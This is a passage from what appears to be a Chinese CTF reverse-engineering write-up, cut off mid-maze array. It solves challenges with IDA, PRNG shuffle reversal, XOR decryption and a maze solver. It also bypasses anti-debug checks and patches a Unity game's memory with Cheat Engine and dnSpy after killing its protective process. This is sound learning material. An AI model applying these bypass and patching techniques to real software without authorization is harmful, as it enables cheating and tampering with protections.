number">19</span><span class="token punctuation">:</span> <span class="token number">10946</span>斐波那契数列：f<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span>，f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>，f<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>，f<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span>，f<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">3</span>，f<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">5</span>，f<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span>，f<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">13</span>，f<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">21</span>，f<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">34</span>，f<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">55.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现规律<br>go(N) = f(N+2)</p><h2 id="5-DEBUG"><a href="#5-DEBUG" class="headerlink" title="5. DEBUG"></a>5. DEBUG</h2><p>最开始运行这个程序，会直接报错。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113141551.png" alt="DEBUG"></p><p>然后利用ida反编译，同时结合 <code>linux_server_64</code>来对 linux中的程序进行动态调试。</p><p>然后，我们定位到这个异常触发的函数。<br><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113141733.png" alt="异常触发函数"></p><p>利用ida重新设置eip 跳过这个函数调用。因为它是fastcall调用方式，看了一下不用平栈操作。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113142011.png" alt="汇编代码"></p><p>然后可以发现程序可以正常进入到main函数里面。<strong>注意，这里面很多函数的命名是我根据函数功能更改的！</strong></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113142152.png" alt="main函数"></p><p>strchange函数 这个函数就是根据随机产生的随机数，然后随机更换字符串中的两个位置的字符。总共换30次。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113142242.png" alt="strchange函数--可以理解为就是个打乱顺序的操作"></p><p>分析到这里，结合伪随机数的特点。如果种子保持一样的话，我们是可以找到strchange函数中的替换字符的顺序。</p><h3 id="思路–这个值得总结嗷！"><a href="#思路–这个值得总结嗷！" class="headerlink" title="思路–这个值得总结嗷！"></a>思路–这个值得总结嗷！</h3><p>然后我们将初始输入的字符串设置为 <code>abcdefghijklmnopqrstuvwxyz012345</code><br>发现，替换过后的字符串为 <code>fqnds40r1ut3aehbiogzmvjxykw2cl5p</code></p><p>可以利用前后的对比，找到特定位置的字符 最后被 替换到的位置。</p><p>然后将最后程序比对的字符串 <code>fa+cmRG25L5Cst5cqO&#123;CLmy6YigZu6&#125;5</code>做逆向操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">original <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz012345"</span><span class="token comment">#ABCDEFGHIGKLMNOPQRSTUVWXYZ</span><span class="token comment">#change ="fipvoj3h0acxekrwbs2tzqulyn1gmd45"</span>change <span class="token operator">=</span> <span class="token string">"fqnds40r1ut3aehbiogzmvjxykw2cl5p"</span><span class="token comment">#"scuctf&#123;ABCDEFGHIGKLMNOPQRSTUVWX&#125;"</span><span class="token comment">#"fa+cmRG25L5Cst5cqO&#123;CLmy6YigZu6&#125;5"</span>original_flag <span class="token operator">=</span> <span class="token string">"fa+cmRG25L5Cst5cqO&#123;CLmy6YigZu6&#125;5"</span>true_flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span>order<span class="token operator">=</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> change<span class="token punctuation">:</span>i <span class="token operator">=</span> original<span class="token punctuation">.</span>find<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>order<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> itrue_flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> original_flag<span class="token punctuation">[</span>j<span class="token punctuation">]</span>j <span class="token operator">=</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>true_flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113152531.png" alt="flag"></p><h3 id="走过的坑"><a href="#走过的坑" class="headerlink" title="走过的坑"></a>走过的坑</h3><p>第一开始，  我直接跳过了调用 这个触发异常的函数 的函数-get_random。</p><blockquote><p>函数调用栈如下：<br>sub_409710  – 真正触发浮点数异常的函数<br>sub_4092F0<br>get_random</p></blockquote><p>但是呢，get_random这个函数里面，还有其他函数可能会设置随机数种子，或者获得随机数。</p><p>我这样跳过的话，就会导致后续产生的随机数发生变化。也就影响替换的顺序。</p><p>这也是为什么，我最开始得到了一个替换顺序，但是替换后的结果明显不对的原因。</p><blockquote><p>–但确实能在本地跑通，那是因为你更改了程序流。新的程序是按照新的随机数产生决定的互换顺序，所以没可以跑通。但未必只有这一种替换顺序，也就是随机数产生的过程未必相符。</p></blockquote><p>之前做过一道，也是类似的情况。是因为我忽略了其他互换情况。–(可以从代码逻辑中发现)。这次的情况，属于误打误撞把，其实也能从代码中看出来，但是是才出来的。~~</p><h2 id="6-ez-logic-—-没做出来"><a href="#6-ez-logic-—-没做出来" class="headerlink" title="6. ez_logic — 没做出来"></a>6. ez_logic — 没做出来</h2><p>这个题是我最开始看的。做了很长时间，没做出来。</p><p>使用了 <code>setjmp</code>，<code>longjmp</code>，跟goto语句有点不一样。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144354.png" alt="setjmp&amp;&amp;longjmp"></p><h3 id="main-函数逻辑"><a href="#main-函数逻辑" class="headerlink" title="main 函数逻辑"></a>main 函数逻辑</h3><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144218.png" alt="函数的跳转逻辑"></p><p>sub_40157F—&gt;sub_4016A9—&gt;sub_401779 这三个都是字符串处理函数。</p><p>里面的逻辑我也清楚，但是就是不知道怎么倒着把目标字符串给提取出来。</p><h3 id="sub-40157F"><a href="#sub-40157F" class="headerlink" title="sub_40157F"></a>sub_40157F</h3><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144758.png" alt="sub_40157F"></p><h3 id="sub-4016A9"><a href="#sub-4016A9" class="headerlink" title="sub_4016A9"></a>sub_4016A9</h3><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144822.png" alt="sub_4016A9"></p><h3 id="sub-401779"><a href="#sub-401779" class="headerlink" title="sub_401779"></a>sub_401779</h3><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144845.png" alt="sub_401779"></p><p>(dword-32位)static_num这个数组</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">01 00 00 00 08 00 00 00  0A 00 00 00 0C 00 00 000F 00 00 00 13 00 00 00  17 00 00 00 1D 00 00 0023 00 00 00 27 00 00 00  2A 00 00 00 2F 00 00 0033 00 00 00 36 00 00 00  3B 00 00 00 3F 00 00 003F 00 00 00 3A 00 00 00  3B 00 00 00 3D 00 00 003D 00 00 00 38 00 00 00  3B 00 00 00 42 00 00 0045 00 00 00 48 00 00 00  4E 00 00 00 50 00 00 0050 00 00 00 4E 00 00 00  4C 00 00 00 51 00 00 0051 00 00 00 53 00 00 00  53 00 00 00 4D 00 00 004E 00 00 00 4E 00 00 00  4C 00 00 00 4C 00 00 004A 00 00 00 4B 00 00 00  4D 00 00 00 4D 00 00 0048 00 00 00 46 00 00 00  43 00 00 00 43 00 00 0041 00 00 00 39 00 00 00  31 00 00 00 2B 00 00 0028 00 00 00 24 00 00 00  21 00 00 00 21 00 00 0019 00 00 00 14 00 00 00  12 00 00 00 11 00 00 000B 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-ez-xxx"><a href="#7-ez-xxx" class="headerlink" title="7. ez_xxx"></a>7. ez_xxx</h2><p>开始就是有两次检查你是否是在调试。ida修改ZF寄存器跳过就可以。</p><p>然后有一个部分，出题人把函数当作数据，进行了异或加密的操作。</p><p>在运行的时候，解密，然后调用这个函数。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113192305.png" alt="逻辑"></p><p>加密数据可以拿到，重要的是分析这个函数。通过动态调试，将ida中解密之后的函数数据拿出来。用 <code>010editor</code>简单编辑之后，送入ida反编译。</p><p>函数本身不复杂，一个简单的异或加密。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113192531.png" alt="反汇编加密函数"></p><blockquote><p>这里突然感慨一下，自己之前非常头疼的栈结构和反汇编代码，现在也是能简单地对应起来分析看了。不得不说，慢慢坚持真的能看到效果。</p></blockquote><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113192955.png" alt="手动分析的栈结构"></p><p>然后就是python解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> oschar_count<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>filepath<span class="token operator">=</span><span class="token string">'funciton_data'</span>binfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token comment">#打开二进制文件</span>size <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token comment">#获得文件大小</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>data <span class="token operator">=</span> binfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#每次输出一个字节</span><span class="token comment">#print(data)</span>data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">(</span>data <span class="token operator">^</span> <span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span>one <span class="token operator">=</span>  <span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>char_count<span class="token punctuation">.</span>append<span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>char_count<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113193102.png" alt="截图"></p><p>有个很奇怪的地方，明明我已经修改了二进制文件的大小。为什么它后面还有这些0？ 按说到最后这个字母就应该结束的~</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113193254.png" alt="funcitondata"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113193355.png" alt="后面这些00"></p><p>难道是因为文件中保存的文件长度没改？</p><h2 id="8-ez-unity"><a href="#8-ez-unity" class="headerlink" title="8. ez_unity"></a>8. ez_unity</h2><p>本题是一个游戏，可以通过cheatengine 来对内存中的数据进行查找。</p><p>遇到的第一个困难就是，这个游戏的内存空间指令没办法看到。感觉像是有什么保护进程，在防止你读写游戏的内存空间。</p><p>打开任务管理器发现，发现一个伴随进程 <code>UnityCrashHandler64.exe</code>。结束掉这个进程，游戏并没有退出，内存空间也可见了。</p><p>所以大概应该是这个进程在对游戏的内存空间进行保护把。</p><h3 id="尝试1-找血量–失败"><a href="#尝试1-找血量–失败" class="headerlink" title="尝试1- 找血量–失败"></a>尝试1- 找血量–失败</h3><p>第一开始，我企图通过血量的变化来找到 血量的数据存放位置。但是无论如何搜索也搜索不到 3 或者 2 或者 1。</p><p>由于游戏是全屏的，所以在使用cheatengine时还要切屏。血条变化又极为迅速。所以很考验我这老年人手速了。</p><p><strong>然后，通过对游戏设计的猜测，我猜测，有关血量的数据很有可能会放到，跟子弹，屏障技能等这些数数据 临近的位置。</strong></p><p><strong>秉持这种猜想，我开始找子弹的存放位置。</strong></p><h3 id="尝试2–找子弹"><a href="#尝试2–找子弹" class="headerlink" title="尝试2–找子弹"></a>尝试2–找子弹</h3><p>子弹的变化，显然比血条的变化要多。因为子弹是20。血条只有3。</p><p>很幸运，通过不断变化游戏当中子弹的数量，我们终于利用多次查找的方式，找到的子弹存放的位置。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221115221020.png" alt="子弹存放位置"></p><p>之后呢，通过右键–找出是什么改写了这个地址</p><p>定位到了一些代码区域。看到了 <code>dec rax</code></p><p>我就猜测这个地方可能是要减少子弹数量，于是乎，我把这个地方改成了 <code>nop</code>指令</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221115221527.png" alt="修改dec-rax 为 nop指令"></p><p>结果我很幸运的实现了，无限子弹这个功能。—可以参考子弹无限的视频。<br>这给我增加了极强的信心!</p><h3 id="尝试3–观察在游戏过程中，子弹附近数据的变化。"><a href="#尝试3–观察在游戏过程中，子弹附近数据的变化。" class="headerlink" title="尝试3–观察在游戏过程中，子弹附近数据的变化。"></a>尝试3–观察在游戏过程中，子弹附近数据的变化。</h3><p>终于，在不断玩游戏的过程中。我发现，换弹(R) 和 屏障(鼠标右键)。这个两个地方是存在标志位的。 如果这个标志位置1，玩家才能按下这个键。期间它是相当于一个冷却时间在里面。</p><p>所以呢，还是依靠上边的思路，右键-找出是什么改写了这个地址。</p><p>找到指令位置后，把相应标志位从 00  – 改成 01</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221115222114.png" alt="修改标志位"></p><p>结果真的实现了无限屏障的功能。！！！！</p><p>可以参看视频—无限屏障。</p><p>太激动啦！！！</p><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><ul><li>win10开启了ALSR，进程每次加载的地址都不一样。所以呢，在用CE找游戏数据的过程中，由于切屏和手速问题，经常误点击了退出。重新加载之后，导致我之前的工作全白费了！！！</li><li>有些游戏肯定会有保护进程，保护这个游戏的内存不被读写，所以我们需要结束掉这个进程才能看到内存空间中的反汇编代码。</li></ul><p>之前那个CE修改游戏进程的，应该是不能保存的。或者说即使保存了，也不没达到修改源码的效果。</p><h3 id="出题人给了点资料"><a href="#出题人给了点资料" class="headerlink" title="出题人给了点资料"></a>出题人给了点资料</h3><p>才明白，要用dnspy，逆向之后修改c#的源代码！！</p><p>主要的函数逻辑都在/Managed/Assembly-CSarp.dll这个 dll 文件中，并且由于c#类似Js的语言特性，几乎就是可以明文随便篡改。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116085013.png" alt="修改源代码"></p><h2 id="9-ez-base"><a href="#9-ez-base" class="headerlink" title="9. ez_base?"></a>9. ez_base?</h2><p>这个题是一个迷宫，但它并不是按照 上下左右 这四种方式来走的。</p><p>他自己规定了8种不同的走法，</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116105334.png" alt="8种不同的走法"></p><ul><li>首先根据字符串和create_encrypt_data函数，生成迷宫。<ul><li>迷宫中只有 非0 的位置可以走</li></ul></li><li>根据用户输入的字符串，确定到底应该按照什么样的走法走<ul><li>走的过程中判断是否抵达边界</li></ul></li><li>走到最后，判断一下是不是到达了出口</li></ul><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116105720.png" alt="迷宫"></p><h3 id="解题方案"><a href="#解题方案" class="headerlink" title="解题方案"></a>解题方案</h3><ul><li>在迷宫生成之后，通过ida <code>shift+e</code> 功能将其数据导出</li><li>然后编写走迷宫的程序，将走法记录下来</li><li>根据走法产生的字符串生成flag–在md5</li></ul><p>这里必须要强调一下，数据结构没学好的弊端了。</p><p><strong>走迷宫需要设计栈或者是图的结构，采用深度优先遍历或者广度优先遍历的方式把迷宫走完。</strong></p><p>像我这种，还采用随机走法的方式，浪费了很多计算资源，甚至到最后也算不出来。</p><p>还有，代码是借鉴了网上一位大神的版本，具体路径给忘了。修改别人代码之后，有问题记得先调试一下，别搞这种一直无限循环的低级错误！</p><blockquote><p>代码里面的迷宫，是我处理之后的，就是把 (0,0)位置改为0，然后呢，把非零的位置改为 0 ，把 0 的位置 改为 1。<br>因为迷宫算法中，只有0的位置才能走。1就相当于是个墙。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pprint <span class="token keyword">import</span> pprintmaze <span class="token operator">=</span> <span class="token punctuation">[</span>                                    <span class="token comment"># 迷宫地图</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span 